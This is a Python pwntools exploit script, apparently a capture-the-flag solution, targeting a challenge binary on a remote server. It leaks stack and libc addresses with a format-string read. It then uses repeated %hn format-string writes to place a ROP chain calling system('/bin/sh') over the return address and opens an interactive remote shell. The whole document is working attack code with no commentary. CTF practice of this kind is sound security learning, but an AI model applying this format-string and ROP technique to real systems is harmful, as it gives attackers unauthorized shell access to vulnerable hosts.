#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF("./chall")
libc = ELF(exe.libc.path)

io = remote("remote.infoseciitr.in", 8007)

io.sendafter(b'>> ', b'A'*0x10 + b'\xac')
io.sendafter(b'>> ', b'%p|%3$p')

leaks = io.recvline().strip().decode().split('|')

rip          = int(leaks[0], 16) + 0x28
libc.address = int(leaks[1], 16) - 0x11ba91

rop  = b''
rop += p64(libc.address + 0x2882f)
rop += p64(libc.address + 0x10f78b)
rop += p64(next(libc.search(b'/bin/sh\x00')))
rop += p64(libc.sym.system)

for i in range(len(rop)//8):
   for j in range(6):
      payload = (f'%{str((u64(rop[i*8:(i+1)*8]) >> (j*8)) & 0xffff)}x'.encode() + b'%8$hn').ljust(16, b'A') + p64(rip + (i*8) + j) + b'\xac'
      io.sendafter(b'>> ', payload[8:])
      io.sendafter(b'>> ', payload[:8])

io.sendafter(b'>> ', b'A'*0x8 + p64(rip-8) + b'\xaa')
io.sendafter(b'>> ', b'A'*8)
io.clean() ; io.interactive()
